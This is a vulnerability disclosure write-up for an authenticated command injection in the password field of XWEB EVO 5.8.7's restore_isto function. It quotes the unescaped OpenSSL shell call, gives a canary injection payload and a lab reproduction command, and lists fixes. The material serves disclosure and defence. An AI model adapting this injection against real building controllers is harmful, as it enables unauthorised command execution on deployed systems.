# PoC21 — XWEB EVO `restore_isto` password command injection

## Status

Dynamically validated against official XWEB3000/5000 EVO 5.8.7 i686
Lighttpd/Lua code in an isolated QEMU/bubblewrap lab. No physical controller or
third-party address was contacted. EVO reached End of Support in March 2026.

A special `Administrator` session is required. This is not an unauthenticated
finding. Physical-device process privileges remain unverified.

## Root cause

When a password is supplied, `restore_isto` concatenates it into an OpenSSL
command before archive validation (`debug.lua:452-454`):

```lua
local retcode = os.execute('openssl enc -d -aes256 -in "'..input_file..
  '" -out "'..input_file..'.dec" -pass "pass:'..password..'" > /dev/null 2>/dev/null')
```

The password is not escaped, so shell separators execute instead of remaining
part of the OpenSSL passphrase.

## Harmless validation

A request without a session returned `PERMISSION_DENIED`. With an
Administrator session and a valid archive, the password value was:

```text
x";printf RESTORE_PASSWORD_CANARY>/opt/setup/templates/restore-password-canary;#
```

The shell created `/opt/setup/templates/restore-password-canary` with content
`RESTORE_PASSWORD_CANARY`. The subsequent restore returned
`{"status":"error"}` in the reduced lab; execution had already occurred. No real
decryption or physical mount was performed. The canary and session were removed.

## Reproduce

```bash
cd /path/to/Ole-K2-Copeland-Firmware-Disclosure
EVO_RESTORE_PASSWORD_TEST=1 lab/run-evo-x86.sh > \
  results/evo-x86-5.8.7-restore-password-injection.txt 2>&1
```

Expected final output: `overall: PASS`. Evidence:
`results/evo-x86-5.8.7-restore-password-injection.txt` and
`lab/evo-x86-restore-password-test.sh`.

## Remediation

- Replace shell-built OpenSSL commands with a fixed-argument process API or a
  maintained encryption library.
- Reject shell metacharacters in password fields and do not expose them on the
  process command line; use a protected descriptor or library API instead.
- Keep Administrator-only authorization and least-privilege restore handling.
- Add password-specific injection tests for every backup/restore action.
